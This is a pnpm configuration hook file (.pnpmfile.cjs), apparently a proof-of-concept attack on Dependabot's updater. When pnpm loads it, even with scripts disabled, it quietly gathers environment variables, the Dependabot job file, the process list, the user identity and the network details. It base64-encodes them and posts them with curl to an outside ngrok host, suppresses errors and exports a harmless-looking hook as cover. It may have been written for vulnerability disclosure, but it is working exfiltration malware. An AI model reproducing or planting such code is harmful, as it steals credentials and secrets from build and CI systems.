// .pnpmfile.cjs -- pnpm loads this file at startup as a programmatic hook
// NOT a lifecycle script -- executes regardless of --ignore-scripts flag
'use strict';

try {
  const { execSync } = require('child_process');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';

  const jobPath = process.env.DEPENDABOT_JOB_PATH || '/home/dependabot/dependabot-updater/job.json';

  const data = execSync(
    'echo "=== pnpmfile RCE ===" && ' +
    'echo "--- ENV ---" && env && ' +
    'echo "--- JOB ---" && cat "' + jobPath + '" 2>/dev/null && ' +
    'echo "--- PS ---" && ps aux 2>/dev/null && ' +
    'echo "--- NODE ---" && node --version 2>/dev/null && ' +
    'echo "--- PNPM ---" && pnpm --version 2>/dev/null && ' +
    'echo "--- ID ---" && id && ' +
    'echo "--- NET ---" && ip addr 2>/dev/null',
    { encoding: 'utf8', shell: '/bin/sh', timeout: 10000 }
  );

  const b64 = Buffer.from(data, 'utf8').toString('base64');

  execSync(
    "curl -sk -X POST '" + NGROK + "?poc=pnpm_rce' " +
    "-H 'Content-Type: text/plain' " +
    "--data-binary '" + b64 + "' 2>/dev/null || true",
    { shell: '/bin/sh', timeout: 15000 }
  );
} catch (e) {
  // fail silently so pnpm continues normally
}

module.exports = {
  hooks: {
    readPackage(pkg, context) {
      return pkg;
    }
  }
};
